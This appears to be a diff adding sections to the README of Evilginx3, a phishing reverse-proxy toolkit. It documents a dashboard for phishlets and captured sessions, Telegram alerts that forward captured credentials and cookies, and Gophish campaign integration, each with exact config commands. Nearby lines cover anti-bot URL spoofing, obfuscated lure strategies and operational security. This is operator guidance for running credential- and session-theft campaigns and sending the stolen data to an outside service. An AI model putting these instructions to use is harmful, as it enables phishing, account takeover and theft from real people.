@@ -367,7 +367,22 @@ antibot action spoof
 antibot spoof_url https://google.com
 ```
 
+### Web API Dashboard
+A built-in JSON API and Web GUI are running automatically on port 2030, allowing you to manage phishlets and view sessions via a structured interface.
+- **Access URL:** `http://YOUR_VPS_IP:2030/`
+
+### Telegram Notifications
+Real-time alerts can be sent directly to your Telegram bot whenever credentials or cookies are captured.
+- Enable via: `config telegram enabled true`
+- Test configuration: `config telegram test`
+
+### Gophish Integration
+Evilginx3 integrates directly with the Gophish database to bridge captured credentials and campaigns.
+- Set API URL: `config gophish admin_url http://127.0.0.1:3333`
+- Set API Key: `config gophish api_key YOUR_GOPHISH_API_KEY`
+
 ---
+
 
 ## 11. Operational Security
 
@@ -417,6 +432,10 @@ sudo lsof -i :443
 | | `config autocert <on|off>` | Enable/disable automatic Let's Encrypt certificates. |
 | | `config lure_strategy <strategy>` | Set lure URL strategy (`short`, `medium`, `long`, `realistic`, `hex`, `base64`, `mixed`). |
 | | `config gophish <args...>` | Configure Gophish integration (`admin_url`, `api_key`, `test`). |
+| | `config telegram bot_token <token>` | Set up the Telegram bot token for notifications. |
+| | `config telegram chat_id <id>` | Set up the Telegram chat ID where notifications will be sent. |
+| | `config telegram enabled <true|false>` | Enable or disable Telegram notifications. |
+| | `config telegram test` | Test the Telegram configuration by sending a test message. |
 | | `config test` | Test the general configuration. |
 | | `config http_port <port>` | Set the HTTP proxy port. |
 | | `config https_port <port>` | Set the HTTPS proxy port. |
